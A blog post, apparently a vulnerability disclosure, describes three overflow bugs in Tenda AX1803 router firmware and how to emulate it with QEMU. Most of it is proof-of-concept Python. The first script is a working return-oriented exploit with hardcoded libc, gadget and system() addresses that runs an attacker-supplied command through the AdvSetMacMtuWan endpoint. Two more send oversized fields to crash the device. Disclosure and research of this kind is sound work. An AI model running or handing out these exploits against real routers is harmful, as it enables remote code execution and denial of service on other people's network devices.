=== Content from www.cnblogs.com_be94fbb2_20250114_185801.html ===


[![](https://img2024.cnblogs.com/blog/35695/202412/35695-20241223074306759-703982459.jpg)](https://www.marscode.cn/?utm_source=advertising&utm_medium=cnblogs.com_ug_cpa&utm_term=hw_marscode_cnblogs&utm_content=home)
[![](https://img2024.cnblogs.com/blog/35695/202412/35695-20241201073014811-1847930772.jpg)](https://www.doubao.com?channel=cnblogs&source=hw_db_cnblogs)

* [![博客园Logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [终身会员](https://cnblogs.vip/buy?modalOpen=true&buyingProduct=vip-lifetime)
* [周边](https://cnblogs.vip/store)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/18341478)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)
  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)
  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  简洁模式 ![](/images/lite-mode-check.svg)...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/L0g4n-blog/)
# [L0g4n](https://www.cnblogs.com/L0g4n-blog)

## 路虽险，行则必至；事虽难，做则必成。

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/L0g4n-blog/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/Riv4ille)
* 订阅
* [管理](https://i.cnblogs.com/)

# [Tenda ax1803 is vulnerable to a buffer overflow](https://www.cnblogs.com/L0g4n-blog/p/16695155.html "发布于 2022-09-15 01:12")

# Tenda ax1803 is vulnerable to a buffer overflow

## Setting up the environment

Create a br0 NIC:

```
sudo tunctl -t br0 -u root
sudo ifconfig br0 192.168.0.1/24
```

Copy qemu-arm-static to the corresponding directory on the filesystem and start the tdhttpd service:

```
sudo chroot . ./qemu-arm-static ./bin/tdhttpd
```
## The first vulnerability

A stack overflow vulnerability exists in the fromAdvSetMacMtuWan function, which can lead to a denial of service or remote code execution vulnerability through a carefully constructed http request.

![](https://img2022.cnblogs.com/blog/1971917/202209/1971917-20220915010344613-140138766.png)

![](https://img2022.cnblogs.com/blog/1971917/202209/1971917-20220915010429470-1102164874.png)

　　The proof-of-concept code for the vulnerability is as follows:

```
import requests,sys
from pwn import *

url = sys.argv[1] + "/goform/AdvSetMacMtuWan"
cmd = sys.argv[2]

libc_base = 0xfef99000
gadget1 = 0xff08dcdc # mov r0, sp ; blx r3
gadget2 = 0xff01987c # mov r3, r4 ; mov r0, r3 ; pop {r4, pc}
system_addr = 0xfefd06c8

payload = '128999999999'+ p32(system_addr) + p32(0xdeadbeef)*3 + p32(gadget2)
payload += p32(0xdeadbeef) + p32(gadget1) + cmd
payload = "wanMTU=%s&wanSpeed=0&cloneType=0&mac=00:00:00:00:00:01"%payload
content_length = len(payload)
headers = {
    "Host":"192.168.0.1",
    "X-Requested-With":"XMLHttpRequest",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "Origin":"http://192.168.0.1",
    "Referer":"http://192.168.0.1/main.html",
    "Content-Length":"%d"%content_length
}

r = requests.post(url,headers = headers,data = payload)
```
## The Second vulnerability

A heap overflow vulnerability exists in the GetParentControlInfo function, which can cause a denial of service attack through a carefully constructed http request.

![](https://img2022.cnblogs.com/blog/1971917/202209/1971917-20220915010708399-177615058.png)

The proof-of-concept code for the vulnerability is as follows:

```
import requests,sys
from pwn import *

url = sys.argv[1] + "/goform/GetParentControlInfo"

payload = 'a'*0x400
payload = 'mac=%s'%payload
content_length = len(payload)
headers = {
    "Host":"192.168.0.1",
    "X-Requested-With":"XMLHttpRequest",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "Origin":"%s"%url,
    "Referer":"%s/main.html"%url,
    "Content-Length":"%d"%content_length
}

r = requests.post(url,headers = headers,data = payload)
```
## The third  vulnerability

A heap overflow vulnerability exists in the setSchedWifi function, which could cause a denial of service by constructing an http request.

![](https://img2022.cnblogs.com/blog/1971917/202209/1971917-20220915011058574-1201555500.png)

The proof-of-concept code for the vulnerability is as follows:

```
import requests,sys
from pwn import *

url = sys.argv[1] + "/goform/openSchedWifi"

payload = 'a'*0x400
payload = 'schedWifiEnable=&schedStartTime=%s&schedEndTime=&timeType=&day='%payload
content_length = len(payload)
headers = {
    "Host":"192.168.0.1",
    "X-Requested-With":"XMLHttpRequest",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "Origin":"%s"%url,
    "Referer":"%s/main.html"%url,
    "Content-Length":"%d"%content_length
}

r = requests.post(url,headers = headers,data = payload)
```

posted @
2022-09-15 01:12
[Riv4ille](https://www.cnblogs.com/L0g4n-blog)
阅读(667)
评论(0)
[编辑](https://i.cnblogs.com/EditPosts.aspx?postid=16695155)
收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202412/35695-20241210184144496-425627414.jpg)](https://www.marscode.cn/?utm_source=advertising&utm_medium=cnblogs.com_ug_cpa&utm_term=hw_marscode_cnblogs&utm_content=home)

### 公告

Copyright © 2025 Riv4ille

Powered by .NET 9.0 on Kubernetes


